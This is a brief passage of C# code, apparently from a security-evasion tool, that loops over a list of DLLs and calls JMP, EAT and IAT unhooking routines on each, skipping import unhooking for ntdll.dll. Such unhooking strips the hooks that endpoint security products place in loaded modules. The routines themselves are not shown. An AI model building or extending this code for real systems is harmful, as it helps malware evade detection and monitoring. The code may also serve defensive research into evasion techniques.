        for (int i = 0; i < ListOfDLLToUnhook.Length; i++) {
            JMPUnhooker(ListOfDLLToUnhook[i]);
            EATUnhooker(ListOfDLLToUnhook[i]);
            if (ListOfDLLToUnhook[i] != "ntdll.dll") {
                IATUnhooker(ListOfDLLToUnhook[i]); // NTDLL have no imports ;)
            }
        }

        Console.WriteLine("[------------------------------------------]");
    }
}

